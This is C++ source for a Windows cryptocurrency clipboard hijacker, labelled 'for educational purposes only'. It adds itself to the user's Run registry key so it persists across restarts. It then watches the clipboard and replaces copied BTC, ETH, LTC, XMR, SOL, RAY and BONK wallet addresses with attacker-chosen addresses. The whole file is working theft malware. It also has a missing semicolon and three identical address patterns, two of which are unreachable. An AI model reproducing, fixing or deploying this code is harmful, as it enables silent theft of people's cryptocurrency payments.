// made for educational purposes only
// made by i
#include <Windows.h>
#include <string>
#include <regex>
#include <thread>
#include <chrono>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")

std::string btcaddr = "BTC address"; 
std::string ethaddr = "ETH address";  
std::string ltcaddr = "LTC address"; 
std::string xmraddr = "XMR address"; 
std::string soladdr = "SOL address"; 
std::string rayaddr = "RAY address" 
std::string bonkaddr = "BONK address"; 

// Function to set clipboard text
void setClipboardText(const std::string& text) {
    if (OpenClipboard(NULL)) {
        EmptyClipboard();
        HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, text.size() + 1);
        memcpy(GlobalLock(hGlobal), text.c_str(), text.size() + 1);
        GlobalUnlock(hGlobal);
        SetClipboardData(CF_TEXT, hGlobal);
        CloseClipboard();
    }
}

// Function to get clipboard text
std::string getClipboardText() {
    std::string clipboardText = "";
    if (OpenClipboard(NULL)) {
        HGLOBAL hData = GetClipboardData(CF_TEXT);
        if (hData) {
            char* pData = static_cast<char*>(GlobalLock(hData));
            clipboardText = pData;
            GlobalUnlock(hData);
        }
        CloseClipboard();
    }
    return clipboardText;
}

// Function to check if the clipboard text is a crypto address
std::string isCryptoAddr(const std::string& clipboardText) {
    // Updated Bitcoin regex pattern for improved accuracy
    std::regex btcPattern(R"(^((bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|[13][a-km-zA-HJ-NP-Z1-9]{26,33})$)");
    std::regex ethPattern(R"(^0x[a-fA-F0-9]{40}$)");
    std::regex ltcPattern(R"(^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)");
    std::regex xmrPattern(R"(^4[0-9AB][0-9a-zA-Z]{93}$)");
    std::regex solPattern(R"(^[1-9A-HJ-NP-Za-km-z]{43,44}$)");
    std::regex rayPattern(R"(^[1-9A-HJ-NP-Za-km-z]{43,44}$)");
    std::regex bonkPattern(R"(^[1-9A-HJ-NP-Za-km-z]{43,44}$)");

    if (std::regex_match(clipboardText, btcPattern)) return "BTC";
    if (std::regex_match(clipboardText, ethPattern)) return "ETH";
    if (std::regex_match(clipboardText, ltcPattern)) return "LTC";
    if (std::regex_match(clipboardText, xmrPattern)) return "XMR";
    if (std::regex_match(clipboardText, solPattern)) return "SOL";
    if (std::regex_match(clipboardText, rayPattern)) return "RAY";
    if (std::regex_match(clipboardText, bonkPattern)) return "BONK";
    return "";
}

// Function to set auto-start registry entry
void setAutoStart() {
    HKEY hKey;
    // Create or open the registry key
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        // Get the full path of the executable
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        // Set the registry value
        RegSetValueExA(hKey, "YourAppName", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
    }
}

// Entry point for GUI applications
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Set auto-start in registry
    setAutoStart();

    while (true) {
        std::string clipboardText = getClipboardText();
        std::string cryptoType = isCryptoAddr(clipboardText);

        if (cryptoType == "BTC") {
            setClipboardText(btcaddr);
        }
        else if (cryptoType == "ETH") {
            setClipboardText(ethaddr);
        }
        else if (cryptoType == "LTC") {
            setClipboardText(ltcaddr);
        }
        else if (cryptoType == "XMR") {
            setClipboardText(xmraddr);
        }
        else if (cryptoType == "SOL") {
            setClipboardText(soladdr);
        }
        else if (cryptoType == "RAY") {
            setClipboardText(rayaddr);
        }
        else if (cryptoType == "BONK") {
            setClipboardText(bonkaddr);
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(150)); // Check clipboard every 150ms
    }

    return 0;
}
